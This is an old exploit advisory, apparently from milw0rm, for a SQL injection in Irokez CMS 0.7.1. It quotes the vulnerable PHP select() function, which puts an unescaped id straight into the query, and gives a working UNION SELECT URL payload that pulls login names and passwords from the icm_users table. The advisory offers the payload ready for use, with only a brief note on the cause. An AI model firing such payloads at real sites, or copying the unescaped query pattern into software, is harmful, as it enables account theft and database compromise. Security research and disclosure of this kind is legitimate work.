<html><head><title>Irokez CMS 0.7.1 Remote SQL Injection Vulnerability</title></head><pre>[+]--------------------------------------------------------------------------------------------------------------------[+]
[+]--------------------------------------------[Irokez 0.7.1 SQL inlection]--------------------------------------------[+]  
[+]--------------------------------------------------------------------------------------------------------------------[+]

-[INFO]----------------------------------------------------------------------------------------------------------------[+]
[+] Title:Irokez 0.7.1 SQL inlection
[+] Autor: Ins3t
[+] Site: www.arthacking.net
[+] Date:04.08.2009
[+]--------------------------------------------------------------------------------------------------------------------[+]

-[BUG INFO]------------------------------------------------------------------------------------------------------------[+]
[+] The vulnerability is caused by insufficient processing of select() function, which led to the SQL inj.
[+] Conditions: magic_quotes_gpc = Off
[+] Code vulnerable functions:

[+]-------------------------------------------------[CODE]--------------------------------------------------------------[+]
  function select($id)
  {
  if (isset($this-&gt;_cache[$id])) {
  $data = $this-&gt;_cache[$id];
  } else {
  $data = array();
  /*
  get data
  */
  $is_trans = in_array($this-&gt;_name.$this-&gt;_trans, $this-&gt;db-&gt;getTables());
  if ($is_trans) {
  $query = &quot;select t.*, m.* from {$this-&gt;_name} m&quot;
  . &quot; left join {$this-&gt;_name}{$this-&gt;_trans} t on (t.{$this-&gt;_item} = m.id)&quot;
  . &quot; where m.id = '$id' group by {$this-&gt;_lang}&quot;;
  } else {
  $query = &quot;select * from {$this-&gt;_name} where id = '$id'&quot;;
  }
  $result = $this-&gt;db-&gt;exeQuery($query);

  $main_fields = $this-&gt;db-&gt;getFields($this-&gt;_name);
  if ($is_trans) {
  $trans_fields = $this-&gt;db-&gt;getFields($this-&gt;_name . $this-&gt;_trans);
  $trans_fields = array_flip($trans_fields);
  } else {
  $trans_fields = array();
  }
  unset($trans_fields[$this-&gt;_item], $trans_fields[$this-&gt;_lang]);
  $trans_fields = array_flip($trans_fields);
   
  $data = array();
  while ($row = mysql_fetch_assoc($result)) {
  foreach ($row as $field =&gt; $value) {
  if (in_array($field, $main_fields)) {
  $data[$field] = $value;
  } elseif (in_array($field, $trans_fields)) {
  $data[$field][$row[$this-&gt;_lang]] = $value;
  }
  }
  }
  if (isset($data['id'])) {
  $this-&gt;_cache[$data['id']] = $data;
  }
  }
  return $data;
  }
[+]------------------------------------------------[/CODE]-------------------------------------------------------------[+]

[+] Exploit: 

[+]-------------------------------------------------[CODE]--------------------------------------------------------------[+]

http://localhost/cms/ru/news/7'+union+select+1,2,concat_ws(0x3a,login,pass),4,5,6,7,8,9,10,11,12+from+icm_users--+/?page=1

[+]------------------------------------------------[/CODE]-------------------------------------------------------------[+]

# milw0rm.com [2009-08-05]</pre></html>